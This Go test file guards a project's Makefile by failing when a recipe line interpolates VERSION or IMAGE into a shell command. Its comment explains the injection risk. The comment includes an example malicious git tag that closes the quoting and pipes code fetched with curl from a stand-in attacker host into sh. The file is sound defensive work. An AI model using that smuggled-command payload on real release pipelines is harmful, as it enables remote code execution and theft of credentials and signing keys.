package guardrails_test

import (
	"os"
	"strings"
	"testing"
)

// No Make recipe may interpolate a version or an image name into a shell
// command.
//
// The values are attacker-influenced. VERSION comes from `git describe --tags`
// or from a release workflow's github.ref_name, and a git tag may legally
// contain a single quote — so a recipe reading `-t '$(VERSION)'` lets a tag
// named
//
//	v1.0.0'; curl evil.example/x | sh; '
//
// close the quoting and run a command inside the release pipeline, which is the
// one pipeline that holds registry credentials and a signing identity. That
// exact shape shipped and was caught by review; this test is what stops it
// coming back.
//
// The fix these recipes use is a target-specific export: Make writes the value
// straight into the child's environment, where no shell parses it, and the
// recipe expands `"$KILASFLOW_VERSION"` instead. So the rule enforced here is
// simply that the make-variable forms never appear in a recipe line.
//
// It lives in guardrails rather than beside the Makefile because it is the same
// class of invariant as the licence boundary: project-wide, owned by no single
// package, and invisible in a diff that looks locally reasonable.
func TestNoMakeRecipeInterpolatesAVersionOrImageIntoAShellCommand(t *testing.T) {
	t.Parallel()

	raw, err := os.ReadFile("../../Makefile")
	if err != nil {
		t.Fatalf("read the Makefile: %v", err)
	}

	// Only the two whose values come from outside the file. APP_NAME is a
	// literal defined on line one and REVISION is a commit hash, so neither is
	// text an attacker supplies; listing them would make this test noise that
	// somebody eventually deletes. VERSION and IMAGE are the ones a git ref or
	// a workflow input reaches.
	//
	// Stored as fragments and joined, so this file does not trip its own check.
	forbidden := []struct{ open, name, close string }{
		{"$(", "VERSION", ")"},
		{"$(", "IMAGE", ")"},
	}

	for number, line := range strings.Split(string(raw), "\n") {
		// A recipe line is one that begins with a tab. Everything else is a
		// variable definition or a target, which Make expands itself and never
		// hands to a shell.
		if !strings.HasPrefix(line, "\t") {
			continue
		}
		for _, pattern := range forbidden {
			needle := pattern.open + pattern.name + pattern.close
			if strings.Contains(line, needle) {
				t.Errorf("Makefile:%d interpolates %s into a shell command:\n\t%s\n"+
					"Pass it through the environment instead — a target-specific "+
					"`export KILASFLOW_%s = %s` and `\"$$KILASFLOW_%s\"` in the recipe — "+
					"because a git tag may contain a quote and this is the release path.",
					number+1, needle, strings.TrimSpace(line), pattern.name, needle, pattern.name)
			}
		}
	}
}
